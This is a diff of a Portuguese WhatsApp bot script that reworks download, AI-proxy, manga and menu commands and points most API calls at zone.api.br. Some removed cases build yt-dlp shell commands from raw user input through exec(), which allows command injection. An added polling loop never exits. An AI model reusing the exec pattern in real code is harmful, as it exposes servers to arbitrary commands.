+}
+
+if (q.startsWith("del ")) {
+
+let id = Number(q.slice(4))-1;
+
+if (!memoria[id]) return reply("❌ Memória não encontrada.");
+
+let removida = memoria.splice(id,1);
+
+fs.writeFileSync(path, JSON.stringify(memoria,null,2));
+
+return reply(`🗑️ Memória removida:
+${removida}`);
+
+}
+
+} catch(e) {
+console.log(e);
+reply("❌ Erro na memória Kiyora.");
+}
+}
+break;
+
+case 'copilot': {
+    const text =
+        body?.slice(command.length + prefix.length).trim() || '';
+
+    if (!q) {
+        return conn.sendMessage(m.chat, {
+            text: `❌ Cade a pergunta?\n\nExemplo:\n${prefix}copilot Qual a capital do Brasil?`
+        }, { quoted: m });
+    }
+
+    try {
+        await conn.sendMessage(m.chat, {
+            react: { text: '👀', key: m.key }
+        });
+
+        const axios = require('axios');
+
+        const { data } = await axios.get(
+            'https://zone.api.br/api/copilot2',
+            {
+                params: {
+                    text,
+                    model: 'gpt-5'
+                }
+            }
+        );
+
+        if (!data?.status || !data?.result) {
+            throw new Error('Sem resposta da API');
+        }
+
+        let result = data.result;
+        const lower = text.toLowerCase();
+
+        // ───────── DETECÇÃO DE FORMATO ─────────
+        const isCode =
+            lower.includes('código') ||
+            lower.includes('codigo') ||
+            lower.includes('code') ||
+            lower.includes('script') ||
+            lower.includes('função') ||
+            lower.includes('funcao') ||
+            lower.includes('programa');
+
+        const isTable =
+            lower.includes('tabela') ||
+            lower.includes('table') ||
+            lower.includes('planilha') ||
+            lower.includes('lista em tabela');
+
+        // ───────── CODE ─────────
+        if (isCode) {
+            try {
+                return conn.makeCode(m.chat, result, m);
+            } catch (err) {
+                console.log('[MAKECODE ERROR]', err);
+                return conn.sendMessage(m.chat, { text: result }, { quoted: m });
+            }
+        }
+
+        // ───────── TABLE (FIX DO ERRO rows.map) ─────────
+        if (isTable) {
+            try {
+                let rows;
+
+                // tenta converter JSON primeiro
+                try {
+                    const parsed = JSON.parse(result);
+                    rows = Array.isArray(parsed) ? parsed : null;
+                } catch {
+                    rows = null;
+                }
+
+                // fallback seguro (nunca quebra)
+                if (!rows) {
+                    rows = result.split('\n').map((line, i) => ({
+                        title: `Linha ${i + 1}`,
+                        description: line
+                    }));
+                }
+
+                return conn.makeTable(m.chat, rows, m);
+
+            } catch (err) {
+                console.log('[MAKETABLE ERROR]', err);
+                return conn.sendMessage(m.chat, { text: result }, { quoted: m });
+            }
+        }
+
+        // ───────── RESPOSTA NORMAL ─────────
+        await conn.sendMessage(m.chat, {
+            text: result
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (e) {
+        console.error('[COPILOT ERROR]', e);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '💔', key: m.key }
+        });
+
+        return conn.sendMessage(m.chat, {
+            text: '❌ Erro ao consultar o Copilot.'
+        }, { quoted: m });
+    }
+}
+break;
 
 //CREDITOS BY GZEESCRIPTSDEV 
 //NAO TIRA OS CRÉDITOS
@@ -12482,7 +22547,7 @@ try {
         react: { text: '⏳', key: info.key }
     });
 
-    const crypto = require('crypto');
+    
     const {
         downloadMediaMessage,
         prepareWAMessageMedia,
@@ -12496,7 +22561,7 @@ try {
         : null;
 
     const caption = argsTemp.join(' ') || q || '';
-    const messageSecret = crypto.randomBytes(32);
+    const messageSecret = crypto.randomBytes(32)
     let innerMsg = {};
     let mediaBuffer = null;
     let mediaType = null;
@@ -12722,7 +22787,7 @@ ${prefix + command} Flamengo`);
     });
 
     const { data } = await axios.get(
-        `https://systemzone.store/api/placar?search=${encodeURIComponent(pesquisa)}`,
+        `https://zone.api.br/api/placar?search=${encodeURIComponent(pesquisa)}`,
         {
             timeout: 20000,
             headers: {
@@ -12820,108 +22885,7 @@ ${prefix + command} Flamengo`);
 }
 }
 break;
- 
-case 'flux': {
-try {
-    const texto = q || args.join(' ');
-    const quoted = info.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-    const quotedKey = info.message?.extendedTextMessage?.contextInfo?.stanzaId;
 
-    if (!quoted) {
-        return reply(`🖼️ *FLUX AI IMAGE EDIT*
-
-Responda a uma imagem com:
-${prefix + command} transforme em anime`);
-    }
-
-    const type = Object.keys(quoted)[0];
-    const mime = quoted[type]?.mimetype || '';
-
-    if (!/image/i.test(mime)) {
-        return reply('❌ Responda a uma imagem para editar.');
-    }
-
-    if (!texto) {
-        return reply(`❌ Forneça um prompt.
-
-Exemplo:
-${prefix + command} transforme em anime`);
-    }
-
-    await conn.sendMessage(from, {
-        react: { text: '⏳', key: info.key }
-    });
-
-    const FormData = require('form-data');
-    const { downloadContentFromMessage } = require('@systemzero/baileys');
-
-    const stream = await downloadContentFromMessage(quoted.imageMessage, 'image');
-
-    let buffer = Buffer.from([]);
-
-    for await (const chunk of stream) {
-        buffer = Buffer.concat([buffer, chunk]);
-    }
-
-    if (!buffer || buffer.length < 1) {
-        throw new Error('Não consegui baixar a imagem.');
-    }
-
-    const form = new FormData();
-    form.append('image', buffer, {
-        filename: 'image.jpg',
-        contentType: mime || 'image/jpeg'
-    });
-    form.append('prompt', texto);
-
-    const { data } = await axios.post(
-        'https://systemzone.store/api/v2/edit/deepai',
-        form,
-        {
-            headers: {
-                ...form.getHeaders(),
-                'User-Agent': 'Mozilla/5.0'
-            },
-            timeout: 120000
-        }
-    );
-
-    if (!data?.status || !data?.imagem) {
-        throw new Error(data?.message || 'API não retornou imagem.');
-    }
-
-    await conn.sendMessage(from, {
-        image: { url: data.imagem },
-        caption: `╭━━〔 ⚡ *FLUX AI* 〕━━⬣
-┃
-┃ 🧠 *Prompt:*
-┃ ${texto}
-┃
-┃ ✅ *Imagem editada com sucesso.*
-┃
-╰━━━━━━━━━━━━━━━━━━⬣`
-    }, { quoted: info });
-
-    await conn.sendMessage(from, {
-        react: { text: '✅', key: info.key }
-    });
-
-} catch (e) {
-    console.log('[ERRO FLUX]', e);
-
-    await conn.sendMessage(from, {
-        react: { text: '❌', key: info.key }
-    });
-
-    reply(`❌ Erro ao processar a imagem.
-
-Motivo:
-${e?.message || 'Tente novamente.'}`);
-}
-}
-break;
-
- 
 case 'addhey': {
 try {
 if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
@@ -13067,14 +23031,12 @@ break;
 
 case 'addai': {
 try {
-if (!isGroup) return reply('❌ Use este comando em grupos.');
 
 await conn.groupParticipantsUpdate(
 from,
 ['867051314767696@bot'],
 'add'
 );
-
 reply('✅ ᴍᴇᴛᴀ ᴀɪ ꜰᴏɪ ᴀᴅɪᴄɪᴏɴᴀᴅᴀ ᴀᴏ ɢʀᴜᴘᴏ ᴄᴏᴍ sᴜᴄᴇssᴏ.');
 } catch (e) {
 console.error(e);
@@ -13083,41 +23045,8 @@ reply('❌ ɴãᴏ ꜰᴏɪ ᴘᴏssíᴠᴇʟ ᴀᴅɪᴄɪᴏɴᴀʀ ᴀ ᴍ�
 }
 break;
 
-case 'rmvip': {
-if (!isDono) return reply('❌ Apenas o dono.');
-
-const alvo = mentionedJid[0];
-if (!alvo) return reply(`Use: ${prefix}rmvip @usuario`);
-
-if (banco[alvo]) {
-banco[alvo].vip = false;
-}
-
-fs.writeFileSync('./database/banco.json', JSON.stringify(banco, null, 2));
-
-reply(`❌ VIP removido de @${alvo.split('@')[0]}`);
-}
-break;
-
-case 'addvip': {
-if (!isDono) return reply('❌ Apenas o dono.');
-
-const alvo = mentionedJid[0];
-if (!alvo) return reply(`Use: ${prefix}addvip @usuario`);
-
-if (!banco[alvo]) banco[alvo] = {};
-
-banco[alvo].vip = true;
-
-fs.writeFileSync('./database/banco.json', JSON.stringify(banco, null, 2));
-
-reply(`💎 VIP adicionado com sucesso para @${alvo.split('@')[0]}`);
-}
-break;
-
 case 'luademel':
 case 'lua_de_mel': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13176,7 +23105,6 @@ mentions: [sender, parceiro]
 break;
 
 case 'encontro': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13316,7 +23244,6 @@ reply('❌ Erro ao flertar.');
 break;
 
 case 'trair': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13427,7 +23354,6 @@ mentions: [sender, alvo]
 break;
 
 case 'beijar': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13495,7 +23421,6 @@ mentions: [sender, alvo]
 break;
 
 case 'terminar': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13643,7 +23568,6 @@ mentions: [userId, alvo]
 break;
 
 case 'engravidar': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync(path))
@@ -13722,7 +23646,6 @@ mentions: [sender, parceiro]
 break;
 
 case 'familia': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 const familia = JSON.parse(fs.readFileSync(path));
@@ -13774,7 +23697,6 @@ mentions: dados.casadoCom ? [dados.casadoCom] : []
 break;
 
 case 'adotar': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
@@ -13875,7 +23797,6 @@ mentions: [alvo, userId, parceiro]
 break;
 
 case 'divorcio': {
-const fs = require('fs');
 const path = './database/familia.json';
 
 const familia = JSON.parse(fs.readFileSync(path));
@@ -14543,30 +24464,6 @@ reply("❌ Erro ao listar resultados.");
 }
 break;
 
-case 'gopen': {
-if (!global.googleSearch?.[from]) return reply("❌ Faça uma pesquisa primeiro.");
-const n = parseInt(args[0]) - 1;
-const r = global.googleSearch[from][n];
-
-if (!r) return reply("❌ Resultado inválido.");
-
-reply(`🔗 *${r.titulo}*\n\n${r.link}`);
-}
-break;
-
-case 'gcopy': {
-if (!global.googleSearch?.[from]) return reply("❌ Faça uma pesquisa primeiro.");
-const n = parseInt(args[0]) - 1;
-const r = global.googleSearch[from][n];
-
-if (!r) return reply("❌ Resultado inválido.");
-
-await conn.sendMessage(from, {
-text: r.link
-}, { quoted: selo });
-}
-break;
-
 case 'pinterest':
 case 'pin': {
 try {
@@ -14766,123 +24663,371 @@ reply('❌ Erro no vídeo.');
 }
 break;
 
-case 'instagram':
-case 'insta':
-case 'instadl': {
+case 'ig':
+case 'instagram': {
 try {
-if (!q) return reply(`📸 Use: ${prefix + command} link do Instagram`);
 
-if (!q.includes('instagram.com')) {
-return reply('❌ Envie um link válido do Instagram.');
+if (!q) {
+return reply(`📥 *Exemplo:*\n${prefix + command} https://www.instagram.com/reel/...`);
 }
 
-await reagir(from, "📸");
+await reagir(from, "⏳");
 
-const api = `https://api.agatz.xyz/api/instagram?url=${encodeURIComponent(q)}`;
-const { data } = await axios.get(api);
+const axios = require("axios");
 
-const result = data?.data || data?.result || data?.media;
+const { data } = await axios.get(
+`https://zone.api.br/api/V2/instagram?apikey=freekey&url=${encodeURIComponent(q)}`
+);
 
-if (!result) return reply('❌ Não consegui baixar esse Instagram.');
+if (!data?.status || !data?.media?.length) {
+await reagir(from, "❌");
+return reply("❌ Não consegui obter essa publicação.");
+}
 
-const midias = Array.isArray(result) ? result : [result];
+const legenda = data.caption || "Sem legenda.";
+const autor = data.author?.name || "Desconhecido";
+const seguidores = data.author?.followers || "0";
+const likes = data.stats?.likes || "0";
 
-for (const midia of midias) {
-const url = midia.url || midia.download_url || midia;
+await conn.sendRich(from, [
 
-if (!url) continue;
+conn.makeText(
+`# 📸 INSTAGRAM
 
-if (url.includes('.mp4')) {
+👤 **Autor:** ${autor}
+
+❤️ **Curtidas:** ${likes}
+
+👥 **Seguidores:** ${seguidores}
+
+## 📝 Legenda
+
+${legenda}`
+)
+
+], info);
+
+for (const media of data.media) {
+
+const isVideo =
+media.endsWith(".mp4") ||
+media.includes("/video") ||
+data.type === "video";
+
+if (isVideo) {
 await conn.sendMessage(from, {
-video: { url },
-caption: `╭━━〔 📸 INSTAGRAM DL 〕━━⬣
-┃ ✅ Vídeo baixado com sucesso
-╰━━━━━━━━━━━━━━⬣`
-}, { quoted: selo });
+video: { url: media },
+caption: "📹 Mídia do Instagram"
+}, { quoted: info });
+
 } else {
+
 await conn.sendMessage(from, {
-image: { url },
-caption: `╭━━〔 📸 INSTAGRAM DL 〕━━⬣
-┃ ✅ Imagem baixada com sucesso
-╰━━━━━━━━━━━━━━⬣`
-}, { quoted: selo });
+image: { url: media },
+caption: "🖼️ Mídia do Instagram"
+}, { quoted: info });
+
 }
+
 }
+
+await reagir(from, "✅");
 
 } catch (e) {
-console.log('[INSTADL ERROR]', e);
-reply('❌ Erro ao baixar do Instagram.');
+
+console.log(e);
+
+await reagir(from, "❌");
+
+reply("❌ Erro ao baixar essa publicação.");
+
 }
 }
 break;
 
 case 'spotify':
-case 'spot':
 case 'spotsearch': {
 try {
-if (!q?.trim()) {
-return reply(`🎵 *PESQUISA SPOTIFY*
 
-Exemplo:
-${prefix}spotify Imagine Dragons
-${prefix}spotify MC Ryan SP`);
+if (!q) {
+return reply(`🎵 *Exemplo:*\n${prefix + command} Amor Hospitalar`);
 }
 
 await reagir(from, "🔍");
 
-const pesquisa = await ytSearch(q.trim() + " audio");
+const { data } = await axios.get(
+`https://zone.api.br/api/search/spotify?q=${encodeURIComponent(q)}&limit=10`
+);
 
-const resultados = pesquisa.videos
-.filter(v => v.seconds && v.seconds > 30 && v.seconds < 900)
-.slice(0, 10);
-
-if (!resultados.length) {
+if (!data?.status || !data?.result?.length) {
 await reagir(from, "❌");
 return reply("❌ Nenhuma música encontrada.");
 }
 
-const rows = resultados.map((v, i) => ({
-header: `🎧 Resultado ${i + 1}`,
-title: `${v.title}`.slice(0, 40),
-description: `${v.author?.name || "YouTube"} • ${v.timestamp || "??:??"}`,
-id: `${prefix}spotify2 https://www.youtube.com/watch?v=${v.videoId}`
-}));
+const lista = data.result;
 
-await conn.relayMessage(from, {
-interactiveMessage: {
-body: {
-text:
-`╭━━〔 🎵 SPOTIFY SEARCH 〕━━⬣
-┃
-┃ 🔎 Pesquisa:
-┃ ${q.trim()}
-┃
-┃ 📌 Resultados: ${rows.length}
-┃ 🎧 Escolha uma música abaixo.
-╰━━━━━━━━━━━━━━⬣`
-},
-footer: { text: "© Zyron-MD" },
-nativeFlowMessage: {
-buttons: [{
-name: "single_select",
-buttonParamsJson: JSON.stringify({
-title: "🎧 Escolher música",
-sections: [{
-title: "Músicas encontradas",
-rows
-}]
-})
-}]
-}
-}
-}, { quoted: selo || info });
+global.spotifyCache ??= {};
+global.spotifyCache[from] = lista;
+
+const tabela = [
+["Nº", "Título"]
+];
+
+lista.forEach((m, i) => {
+tabela.push([
+String(i + 1),
+m.title
+]);
+});
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🎵 Spotify
+
+🔎 Pesquisa: **${q}**
+
+Foram encontrados **${lista.length}** resultados.
+
+Digite:
+
+\`${prefix}spotify2 número\`
+
+Exemplo:
+
+\`${prefix}spotify2 1\``
+),
+
+conn.makeTable(tabela),
+
+conn.makeText(
+lista.map((m, i) =>
+`**${i + 1}.** ${m.title}
+👤 ${m.artists}
+⏱ ${m.duration}`
+).join("\n\n")
+)
+
+], info, [
+"RICH_RESPONSE_TABLE"
+]);
 
 await reagir(from, "✅");
 
 } catch (e) {
-console.log("[SPOTIFY SEARCH ERROR]", e);
+console.log(e);
 await reagir(from, "❌");
 reply("❌ Erro ao pesquisar músicas.");
+}
+}
+break;
+
+case 'spotify2': {
+try {
+
+if (!q) {
+return reply(`🎵 Exemplo:\n${prefix}spotify2 1`);
+}
+
+const cache = global.spotifyCache?.[from];
+
+if (!cache) {
+return reply("❌ Faça uma pesquisa primeiro usando o comando spotify.");
+}
+
+const index = Number(q) - 1;
+
+if (isNaN(index) || !cache[index]) {
+return reply("❌ Número inválido.");
+}
+
+await reagir(from, "⏳");
+
+const musica = cache[index];
+
+const { data } = await axios.get(
+`https://zone.api.br/api/spotify?url=${encodeURIComponent(musica.url)}`
+);
+
+if (!data?.status) {
+throw new Error("Falha ao baixar");
+}
+
+await conn.sendRich(from, [
+
+conn.makeText(
+`# 🎶 Baixando Música
+
+**${data.title}**
+
+👤 ${musica.artists}
+⏱ ${musica.duration}
+
+Aguarde alguns segundos...`
+)
+
+], info);
+
+await conn.sendMessage(from, {
+audio: {
+url: data.download_url.replace(/^http:\/\//, "https://")
+},
+mimetype: "audio/mpeg",
+fileName: `${data.title}.mp3`
+}, {
+quoted: info
+});
+
+await reagir(from, "✅");
+
+} catch (e) {
+console.log(e);
+await reagir(from, "❌");
+reply("❌ Erro ao baixar a música.");
+}
+}
+break;
+
+case 'help':
+case 'helpp':
+case 'ajuda': {
+  try {
+
+    let texto = `
+🤖 *Zyron-MD MENU*
+
+📌 *Comandos básicos:*
+$menu - ver menu
+$ping - testar bot
+$info - informações
+$owner - dono do bot
+
+🎨 *Imagens:*
+$flux - gerar imagem
+$anime - imagem anime
+$nano - edita imagens
+
+🧠 *IA:*
+Zyron - perguntar algo
+Veyron - conversar com IA
+$coder - traduzir texto
+
+👥 *Grupos:*
+$tagall - marcar todos
+$hidetag - mensagem oculta
+$kick - remover usuário
+$promote - promover
+
+🛠️ *Admin:*
+$ban - banir usuário
+$unban - remover ban
+$block - bloquear
+$unblock - desbloquear
+
+⚡ *Extras:*
+$calc - calculadora
+$clima - clima da cidade
+$ping - velocidade
+
+📌 *Bot em desenvolvimento...*
+`;
+
+    await conn.sendMessage(from, {
+      text: texto.trim(),
+      footer: "⚡ Zyron-MD | Sistema ativo",
+      buttons: [
+        { buttonId: 'flux', buttonText: { displayText: '🖼️ Imagem' }, type: 1 },
+        { buttonId: 'Zyron', buttonText: { displayText: '🤖 IA' }, type: 1 },
+        { buttonId: 'menu', buttonText: { displayText: '📜 Menu' }, type: 1 }
+      ],
+      headerType: 1
+    }, { quoted: info });
+
+  } catch (e) {
+    console.log(e);
+    reply('❌ Erro ao abrir menu.');
+  }
+}
+break;
+
+case 'zyronimagine':
+case 'zyronai': {
+try {
+
+if (!q) return reply(`🖼️ *ZYRON IMAGINE AI*
+
+Use:
+${prefix + command} texto
+
+Exemplo:
+${prefix + command} um carro futurista na lua`);
+
+const axios = require("axios");
+
+await reagir(from, "🎨");
+
+reply("⏳ Gerando suas imagens com Zyron-AI...");
+
+const { data: gerar } = await axios.post(
+"https://zone.api.br/api/v1/grokimagine?apikey=API_KEY_SYSTEM",
+{
+prompt: q
+}
+);
+
+if (!gerar.status) {
+return reply("❌ Erro ao iniciar geração.");
+}
+
+const job = gerar.job_id;
+
+reply(`⏳ Imagens na fila...
+
+Aguarde alguns segundos...`);
+
+let resultado;
+let tentativas = 0;
+
+while (true) {
+
+await new Promise(resolve => setTimeout(resolve, 5000));
+
+const { data } = await axios.get(
+`https://zone.api.br/api/v1/grokimagine/status`,
+{
+params: {
+job_id: job
+}
+}
+);
+
+resultado = data;
+
+if (data.estado === "done") break;
+
+tentativas++;
+}
+
+if (!resultado || resultado.estado !== "done") {
+return reply("❌ Tempo esgotado para gerar as imagens.");
+}
+
+reply(`✅ Pronto!
+
+Enviando resultado...`);
+
+const img = resultado.result_urls[0];
+
+await conn.sendMessage(from, {
+image: {
+url: img
+},
+caption: `🎨 *Zyron Imagine AI*`
+});
+
+} catch (e) {
+console.log(e);
+reply("❌ Erro ao gerar imagem.");
 }
 }
 break;
@@ -14890,6 +25035,7 @@ break;
 case 'manga':
 case 'mangá': {
 try {
+
 const PDFDocument = require("pdfkit");
 const {
 generateWAMessageFromContent,
@@ -14900,15 +25046,15 @@ proto
 global.mangaCache = global.mangaCache || new Map();
 
 if (!q?.trim()) {
-return reply(
-`📚 *Como usar:*
+return reply(`
+📚 Como usar:
 
 ${prefix + command} <nome do mangá>
 ${prefix + command} <url do mangá>
 
-📌 *Exemplo:*
-${prefix + command} gachiakuta`
-);
+📌 Exemplo:
+${prefix + command} gachiakuta
+`);
 }
 
 await reagir(from, "🔍");
@@ -14916,10 +25062,13 @@ await reagir(from, "🔍");
 function gerarThumbnailPadrao(titulo) {
 const svg = `
 <svg xmlns="http://www.w3.org/2000/svg" width="300" height="400">
-<rect width="300" height="400" fill="#111827"/>
-<text x="150" y="180" font-size="55" text-anchor="middle">📚</text>
-<text x="150" y="240" font-size="22" fill="#fff" text-anchor="middle">${titulo || "Mangá"}</text>
-</svg>`;
+  <rect width="300" height="400" fill="#111827"/>
+  <text x="150" y="180" font-size="55" text-anchor="middle">📚</text>
+  <text x="150" y="240" font-size="22" fill="#fff" text-anchor="middle">
+    ${titulo || "Mangá"}
+  </text>
+</svg>
+`;
 return Buffer.from(svg);
 }
 
@@ -14962,8 +25111,14 @@ return false;
 let capitulos = [];
 
 $(".chapter-grid-link").each((i, el) => {
-const numero = $(el).find(".chapter-grid-number span").text().trim() || `Capítulo ${i + 1}`;
-const nome = $(el).find(".chapter-grid-title").text().trim() || numero;
+const numero =
+$(el).find(".chapter-grid-number span").text().trim() ||
+`Capítulo ${i + 1}`;
+
+const nome =
+$(el).find(".chapter-grid-title").text().trim() ||
+numero;
+
 const urlCap = $(el).attr("href");
 
 if (urlCap) {
@@ -15022,6 +25177,7 @@ const porGrupo = 2;
 
 for (let i = 0; i < resultado.capitulos.length; i += porGrupo) {
 const grupo = resultado.capitulos.slice(i, i + porGrupo);
+
 const id = `manga_${Date.now()}_${i}`;
 
 global.mangaCache.set(id, {
@@ -15035,7 +25191,7 @@ sections.push({
 title: `📚 Capítulos ${i + 1} até ${i + grupo.length}`,
 rows: [{
 title: `📖 Capítulo ${i + 1}${grupo.length > 1 ? ` até ${i + grupo.length}` : ""}`,
-description: `${grupo.length} capítulo${grupo.length > 1 ? "s" : ""}`,
+description: `${grupo.length} capítulo(s)`,
 id
 }]
 });
@@ -15043,8 +25199,8 @@ id
 
 const texto = `
 ╭━━━〔 📚 𝐌𝐀𝐍𝐆Á 〕━━━╮
-┃ 📖 Nome: *${resultado.titulo}*
-┃ 📚 Total: *${resultado.capitulos.length} capítulos*
+┃ 📖 Nome: ${resultado.titulo}
+┃ 📚 Total: ${resultado.capitulos.length} capítulos
 ╰━━━━━━━━━━━━━━━━╯
 
 💡 Selecione abaixo o capítulo que deseja baixar em PDF.
@@ -15087,69 +25243,9 @@ console.log("[MANGA ERRO]", e);
 await reagir(from, "❌");
 reply(`❌ Erro ao buscar mangá:\n${e.message}`);
 }
+
 break;
 }
-
-case 'spotify2': {
-try {
-if (!q?.trim()) return reply("❌ Escolha uma música da lista.");
-
-await reagir(from, "⏳");
-
-const pasta = "./tmp";
-if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);
-
-const nome = `spotify_${Date.now()}`;
-const caminho = `${pasta}/${nome}.mp3`;
-
-let link = q.trim();
-
-// Corrige https:\/\/
-link = link.replace(/\\\//g, "/");
-
-console.log("LINK:", link);
-
-await conn.sendMessage(from, {
-text: "🎧 *Baixando música...*\n⏳ Aguarde alguns segundos."
-}, { quoted: selo || info });
-
-exec(
-`yt-dlp -x --audio-format mp3 --audio-quality 0 -o "${caminho}" "${link}"`,
-async (err, stdout, stderr) => {
-
-if (err) {
-console.log(stderr || err);
-await reagir(from, "❌");
-return reply("❌ Erro ao baixar a música.");
-}
-
-if (!fs.existsSync(caminho)) {
-await reagir(from, "❌");
-return reply("❌ O arquivo não foi gerado.");
-}
-
-await conn.sendMessage(from, {
-audio: fs.readFileSync(caminho),
-mimetype: "audio/mpeg",
-fileName: `${nome}.mp3`,
-ptt: false
-}, { quoted: selo || info });
-
-try {
-fs.unlinkSync(caminho);
-} catch {}
-
-await reagir(from, "✅");
-
-});
-
-} catch (e) {
-console.log("[SPOTIFY DL ERROR]", e);
-await reagir(from, "❌");
-reply("❌ Erro ao baixar.");
-}
-}
-break;
 
 case 'mediefire':
 case 'mediafire': {
@@ -15219,8 +25315,6 @@ break;
 
 case 'pack': {
 try {
-    const fs = require('fs');
-    const crypto = require('crypto');
 
     const pesquisa = q || text || args.join(' ');
 
@@ -15233,7 +25327,7 @@ try {
     });
 
     const { data } = await axios.post(
-        'https://systemzone.store/api/v1/stickerly/search',
+        'https://zone.api.br/api/v1/stickerly/search',
         { q: pesquisa },
         { timeout: 20000 }
     );
@@ -15247,7 +25341,7 @@ try {
     reply(`📦 Pack encontrado: *${firstPack.name}*\n\n⏳ Baixando e enviando até *30 figurinhas*...`);
 
     const { data: dlData } = await axios.post(
-        'https://systemzone.store/api/v1/stickerly/download',
+        'https://zone.api.br/api/v1/stickerly/download',
         { url: firstPack.shareUrl },
         { timeout: 30000 }
     );
@@ -15496,58 +25590,33 @@ try {
 break;
 }
 
-case 'pdoc': {
-  try {
-    if (!q) return reply(`🎥 Use:\n${prefix + command} link_do_video`);
-
-    if (!q.startsWith('http')) {
-      return reply('❌ Envie uma URL válida.');
-    }
-
-    await reagir(from, '⏳');
-
-    const fs = require('fs');
-
-    const pasta = './temp';
-    if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);
-
-    const nome = `video_${Date.now()}.mp4`;
-    const saida = path.join(pasta, nome);
-
-    const cmd = `yt-dlp -f "mp4/best" -o "${saida}" "${q}"`;
-
-    exec(cmd, async (erro, stdout, stderr) => {
-      try {
-        if (erro) {
-          console.log(stderr);
-          await reagir(from, '❌');
-          return reply('❌ Não consegui baixar esse vídeo. Talvez o site não seja suportado ou o link esteja protegido.');
-        }
-
-        if (!fs.existsSync(saida)) {
-          await reagir(from, '❌');
-          return reply('❌ O vídeo não foi encontrado após o download.');
-        }
-
-        await client.sendMessage(from, {
-          video: fs.readFileSync(saida),
-          mimetype: 'video/mp4',
-          caption: `✅ *Vídeo baixado com sucesso!*`
-        }, { quoted: info });
-
-        fs.unlinkSync(saida);
-        await reagir(from, '✅');
-
-      } catch (e) {
-        console.log(e);
-        reply('❌ Erro ao enviar o vídeo.');
-      }
-    });
-
-  } catch (e) {
-    console.log(e);
-    reply('❌ Erro no comando baixar vídeo.');
-  }
+default: {
+await conn.sendMessage(from, {
+text: `╭━━━〔 ❌ ERRO 〕━━━╮
+┃
+┃  *Comando não encontrado!*
+┃
+┃  bb O comando que você tentou usar
+┃  não existe ou foi digitado errado.
+┃
+┃  🔎 Verifique o comando bb
+┃
+┃  📋 Clique abaixo para ver todos
+┃  os comandos disponíveis.
+┃
+╰━━━━━━━━━━━━━━╯`,
+footer: NomeBot,
+buttons: [
+{
+buttonId: `${prefix}menu`,
+buttonText: {
+displayText: "📋 MENU"
+},
+type: 1
+}
+],
+headerType: 1
+}, { quoted: info });
 }
 break;
 
